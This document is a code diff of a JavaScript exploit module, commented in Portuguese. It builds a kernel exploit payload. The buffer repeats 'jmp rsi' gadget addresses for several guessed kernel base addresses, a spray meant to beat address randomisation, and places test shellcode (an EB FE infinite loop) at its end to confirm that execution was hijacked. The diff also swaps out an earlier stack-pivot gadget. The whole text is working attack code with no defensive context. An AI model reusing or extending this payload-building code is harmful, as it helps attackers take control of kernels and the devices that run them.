@@ -1,34 +1,37 @@
 import { CONFIG, GADGETS } from './config.mjs';
 
-// Constrói um buffer contendo ponteiros para múltiplas bases possíveis
-export function build_rainbow_payload() {
-    const size = 0x400; // Tamanho fixo (1024 bytes)
+export function build_universal_payload(size) {
     const buffer = new Uint32Array(size / 4);
     const view = new DataView(buffer.buffer);
 
-    // O Padrão Arco-Íris:
-    // Offset 0: Pivot da Base A
-    // Offset 8: Pivot da Base B
-    // Offset 16: Pivot da Base C
-    // ...
+    // ESTRATÉGIA "RAINBOW":
+    // Preenchemos o objeto repetindo os endereços de pulo para TODAS as bases.
+    // Padrão: [Gadget_Base1] [Gadget_Base2] [Gadget_Base3] ...
     
-    // Se o Kernel pular para o Offset 0, testa Base A.
-    // Se pular para Offset 8 (devido a desalinhamento), testa Base B.
-    // Isso aumenta nossas chances estatísticas.
-
     let offset = 0;
-    while(offset < size) {
+    while (offset < size) {
         for (let base of CONFIG.TARGET_BASES) {
             if (offset + 8 > size) break;
+
+            // Calcula o endereço do gadget JMP RSI para esta base
+            let gadget_addr = base + GADGETS.jmp_rsi;
             
-            // Calcula endereço absoluto do Pivot para esta base
-            // Pivot: xchg rsp, rax
-            let gadget = base + GADGETS.xchg_rsp_rax;
-            
-            view.setBigUint64(offset, gadget, true); // Little Endian
+            // Escreve no buffer
+            view.setBigUint64(offset, gadget_addr, true); // Little Endian
             offset += 8;
         }
     }
     
+    // INJEÇÃO DE SHELLCODE (Payload Passivo)
+    // Colocamos o "Infinite Loop" (EB FE) no final do objeto.
+    // Se o gadget funcionar, ele pula para RSI (este objeto) e executa o loop.
+    
+    // Offset seguro no final (últimos 16 bytes)
+    const code_pos = size - 16;
+    if (code_pos > 0) {
+        view.setUint8(code_pos, 0xEB);
+        view.setUint8(code_pos+1, 0xFE);
+    }
+
     return buffer;
 }
